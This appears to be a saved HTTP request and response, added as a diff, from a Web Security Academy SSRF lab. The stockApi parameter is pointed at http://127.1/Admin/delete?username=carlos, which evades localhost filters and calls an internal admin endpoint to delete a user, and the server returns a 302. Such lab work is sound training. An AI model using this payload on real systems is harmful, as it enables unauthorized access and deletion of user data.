@@ -1,0 +1,24 @@
+POST https://0ac600c1047bce67849d093600f70058.web-security-academy.net/product/stock HTTP/1.1
+host: 0ac600c1047bce67849d093600f70058.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://0ac600c1047bce67849d093600f70058.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+content-length: 66
+Origin: https://0ac600c1047bce67849d093600f70058.web-security-academy.net
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Cookie: session=VJhKkjGv74RoaiSHvTNSTWctZeDFzNzK
+
+stockApi=http%3A%2F%2F127%2E1%2FAdmin%2Fdelete%3Fusername%3DcarlosHTTP/1.1 302 Found
+Location: /admin
+Set-Cookie: session=9OzxQDN4gtnY6Y5N1P3uiOdzH50P99r2; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Encoding: gzip
+Connection: close
+Content-Length: 0
+
